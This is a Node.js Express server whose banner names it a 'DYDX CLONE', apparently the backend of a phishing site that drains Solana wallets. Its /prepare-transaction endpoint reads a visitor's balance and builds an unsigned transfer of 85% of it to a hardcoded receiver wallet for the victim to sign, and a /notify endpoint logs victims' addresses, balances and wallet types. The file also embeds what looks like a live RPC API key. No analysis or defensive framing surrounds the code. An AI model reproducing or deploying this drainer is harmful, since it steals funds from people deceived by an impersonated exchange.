const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

// Create Express app
const app = express();

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// ============================================
// CONFIGURATION
// ============================================
const HELIUS_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';

// Create connection
let connection;
try {
    connection = new Connection(HELIUS_RPC, {
        commitment: 'confirmed',
        confirmTransactionInitialTimeout: 60000
    });
    console.log('[OK] Connection created to Helius');
} catch (err) {
    console.error('[ERROR] Failed to create connection:', err.message);
    process.exit(1);
}

// Validate receiver wallet
let receiverPublicKey;
try {
    receiverPublicKey = new PublicKey(RECEIVER_WALLET);
    console.log('[OK] Receiver wallet valid:', RECEIVER_WALLET);
} catch (err) {
    console.error('[ERROR] Invalid receiver wallet:', err.message);
    process.exit(1);
}

// ============================================
// HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: Date.now(),
        receiver: RECEIVER_WALLET.substring(0, 8) + '...'
    });
});

// ============================================
// API: GET BALANCE
// ============================================
app.post('/api/getBalance', async (req, res) => {
    console.log('[API] /api/getBalance called');
    
    try {
        const { publicKey } = req.body;
        
        if (!publicKey) {
            console.log('[ERROR] Missing publicKey');
            return res.status(400).json({ error: 'publicKey is required' });
        }
        
        let pubkey;
        try {
            pubkey = new PublicKey(publicKey);
        } catch (err) {
            console.log('[ERROR] Invalid publicKey:', publicKey);
            return res.status(400).json({ error: 'Invalid publicKey: ' + err.message });
        }
        
        const balance = await connection.getBalance(pubkey);
        const solBalance = (balance / LAMPORTS_PER_SOL).toFixed(6);
        
        console.log(`[OK] Balance for ${publicKey.substring(0, 8)}...: ${solBalance} SOL`);
        res.json({ success: true, balance: balance });
        
    } catch (err) {
        console.error('[ERROR] /api/getBalance:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// API: GET BLOCKHASH
// ============================================
app.post('/api/getBlockhash', async (req, res) => {
    console.log('[API] /api/getBlockhash called');
    
    try {
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        console.log(`[OK] Blockhash: ${blockhash}, valid until: ${lastValidBlockHeight}`);
        res.json({ success: true, blockhash, lastValidBlockHeight });
    } catch (err) {
        console.error('[ERROR] /api/getBlockhash:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// API: SEND TRANSACTION
// ============================================
app.post('/api/sendTransaction', async (req, res) => {
    console.log('[API] /api/sendTransaction called');
    
    try {
        const { transaction } = req.body;
        
        if (!transaction) {
            console.log('[ERROR] Missing transaction');
            return res.status(400).json({ error: 'transaction is required' });
        }
        
        // Convert base64 to buffer
        const txBuffer = Buffer.from(transaction, 'base64');
        console.log(`[OK] Transaction size: ${txBuffer.length} bytes`);
        
        // Send raw transaction
        const signature = await connection.sendRawTransaction(txBuffer, {
            skipPreflight: false,
            preflightCommitment: 'confirmed',
            maxRetries: 3
        });
        
        console.log(`[OK] Transaction sent: ${signature}`);
        
        // Don't wait for confirmation - just return the signature
        res.json({ success: true, txid: signature });
        
    } catch (err) {
        console.error('[ERROR] /api/sendTransaction:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// API: PREPARE TRANSACTION (CRITICAL - THIS WAS FAILING)
// ============================================
app.post('/prepare-transaction', async (req, res) => {
    console.log('[API] /prepare-transaction called');
    
    try {
        const { publicKey } = req.body;
        
        // Validate input
        if (!publicKey) {
            console.log('[ERROR] Missing publicKey');
            return res.status(400).json({ success: false, error: 'publicKey is required' });
        }
        
        console.log(`[OK] PublicKey received: ${publicKey.substring(0, 8)}...`);
        
        // Parse from public key
        let fromPubkey;
        try {
            fromPubkey = new PublicKey(publicKey);
            console.log('[OK] From pubkey parsed successfully');
        } catch (err) {
            console.log('[ERROR] Failed to parse fromPubkey:', err.message);
            return res.status(400).json({ success: false, error: 'Invalid publicKey: ' + err.message });
        }
        
        // Parse to public key (receiver)
        let toPubkey;
        try {
            toPubkey = new PublicKey(RECEIVER_WALLET);
            console.log('[OK] To pubkey parsed successfully');
        } catch (err) {
            console.log('[ERROR] Failed to parse toPubkey:', err.message);
            return res.status(500).json({ success: false, error: 'Server configuration error: invalid receiver wallet' });
        }
        
        // Get balance
        let balance;
        try {
            balance = await connection.getBalance(fromPubkey);
            console.log(`[OK] Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
        } catch (err) {
            console.log('[ERROR] Failed to get balance:', err.message);
            return res.status(500).json({ success: false, error: 'Failed to get balance: ' + err.message });
        }
        
        // Check minimum balance (0.02 SOL)
        const MIN_BALANCE_SOL = 0.02;
        const MIN_BALANCE_LAMPORTS = MIN_BALANCE_SOL * LAMPORTS_PER_SOL;
        
        if (balance < MIN_BALANCE_LAMPORTS) {
            console.log(`[ERROR] Insufficient balance: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL < ${MIN_BALANCE_SOL} SOL`);
            return res.json({ 
                success: false, 
                error: `Insufficient balance. Have: ${(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL, Need: ${MIN_BALANCE_SOL} SOL` 
            });
        }
        
        // Calculate amount to send (85% to be safe)
        const FEE_BUFFER_PERCENT = 0.85;
        const amountToSend = Math.floor(balance * FEE_BUFFER_PERCENT);
        
        if (amountToSend <= 0) {
            console.log('[ERROR] Calculated amount to send is zero or negative');
            return res.json({ success: false, error: 'Amount to send is zero after fees' });
        }
        
        console.log(`[OK] Amount to send: ${(amountToSend / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
        
        // ============================================
        // CRITICAL: Create transaction WITHOUT blockhash
        // ============================================
        const transaction = new Transaction();
        
        // Add transfer instruction
        const transferIx = SystemProgram.transfer({
            fromPubkey: fromPubkey,
            toPubkey: toPubkey,
            lamports: amountToSend,
        });
        transaction.add(transferIx);
        
        // IMPORTANT: Do NOT set recentBlockhash here
        // The frontend will add a fresh blockhash before signing
        
        // Serialize the transaction WITHOUT blockhash and WITHOUT signatures
        const serializedTransaction = transaction.serialize({
            requireAllSignatures: false,  // Don't require signatures yet
            verifySignatures: false       // Don't verify signatures yet
        });
        
        console.log(`[OK] Transaction serialized, size: ${serializedTransaction.length} bytes`);
        console.log('[OK] Returning transaction to frontend');
        
        // Return the serialized transaction as an array of bytes
        res.json({
            success: true,
            transaction: Array.from(serializedTransaction),
            amount: amountToSend,
            amountSol: (amountToSend / LAMPORTS_PER_SOL).toFixed(6)
        });
        
    } catch (err) {
        console.error('[ERROR] /prepare-transaction catastrophic failure:', err.message);
        console.error('[ERROR] Stack:', err.stack);
        res.status(500).json({ 
            success: false, 
            error: err.message,
            stack: process.env.NODE_ENV === 'development' ? err.stack : undefined
        });
    }
});

// ============================================
// API: NOTIFICATION
// ============================================
app.post('/notify', (req, res) => {
    const { address, balance, walletType, customMessage } = req.body;
    console.log('\n[NOTIFICATION] ================================');
    console.log(`[NOTIFICATION] Message: ${customMessage}`);
    console.log(`[NOTIFICATION] Address: ${address ? address.substring(0, 8) + '...' : 'unknown'}`);
    console.log(`[NOTIFICATION] Balance: ${balance} SOL`);
    console.log(`[NOTIFICATION] Wallet: ${walletType}`);
    console.log('[NOTIFICATION] ================================\n');
    res.json({ ok: true });
});

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 5000;

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(60));
    console.log('🚀 DYDX CLONE SERVER STARTED SUCCESSFULLY');
    console.log('='.repeat(60));
    console.log(`📡 Port: ${PORT}`);
    console.log(`🔗 RPC: ${HELIUS_RPC.substring(0, 50)}...`);
    console.log(`🎯 Receiver: ${RECEIVER_WALLET.substring(0, 8)}...${RECEIVER_WALLET.substring(RECEIVER_WALLET.length - 8)}`);
    console.log(`🌐 Health check: http://localhost:${PORT}/health`);
    console.log('='.repeat(60) + '\n');
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, closing server...');
    server.close(() => {
        console.log('Server closed');
        process.exit(0);
    });
});
